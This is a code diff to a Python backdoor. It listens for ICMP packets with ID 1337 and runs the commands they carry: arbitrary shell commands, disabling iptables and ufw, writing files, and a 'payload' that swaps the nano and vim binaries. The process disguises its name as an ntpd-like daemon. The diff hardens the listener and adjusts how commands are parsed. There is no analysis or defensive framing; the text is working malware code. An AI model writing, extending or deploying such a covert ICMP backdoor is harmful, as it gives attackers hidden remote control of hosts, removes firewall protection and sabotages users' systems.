@@ -22,17 +22,18 @@ def persist():
 
 #Switches the binaries for nano and vim
 def payload():
-        print "Payload fired"
-        os.system("wall 'firing off payload'")
-        os.system("cp /bin/nano /bin/nano.bak")
-        os.system("cp /usr/bin/vim /usr/bin/vim.bak")
-        os.system("mv /bin/nano /usr/bin/vim")
-        os.system("mv /usr/bin/vim.bak /bin/nano")
+	print "Payload fired"
+	os.system("wall 'firing off payload'")
+	os.system("cp /bin/nano /bin/nano.bak")
+	os.system("cp /usr/bin/vim /usr/bin/vim.bak")
+	os.system("mv /bin/nano /usr/bin/vim")
+	os.system("mv /usr/bin/vim.bak /bin/nano")
 
 
 def parse_command( message ):
+	print message
 	if "write" in message:
-		cmd = message.split(",")[1]
+		cmd = message.split("write,")[1]
 		cmd = "echo '" + cmd + "' >> hellofriend"
 		os.system(cmd)
 	elif "dropfw" in message:
@@ -47,7 +48,7 @@ def parse_command( message ):
 		os.system("iptables -P OUTPUT ACCEPT 2> /dev/null")
 		os.system("ufw disable")
 	elif "command" in message:
-		cmd = message.split(",")[1]
+		cmd = message.split("command,")[1]
 		os.system(cmd)
 	elif "payload" in message:
 		payload()
@@ -67,10 +68,12 @@ def listen():
 		dat = data[28:]
 		type, code, checksum, p_id, sequence = struct.unpack('bbHHh', icmp_header)
 		if p_id == 1337:
+			try:
 			#This is a special message
-			parse_command(dat)
-		#print "Packet from %r: its id is: %r" % (addr,p_id)
-
+				parse_command(dat)
+				#print "Packet from %r: its id is: %r" % (addr,p_id)
+			except:
+				continue
 
 if __name__=="__main__":
         setproctitle.setproctitle("/bin/bash time-ntpd --no-reload")
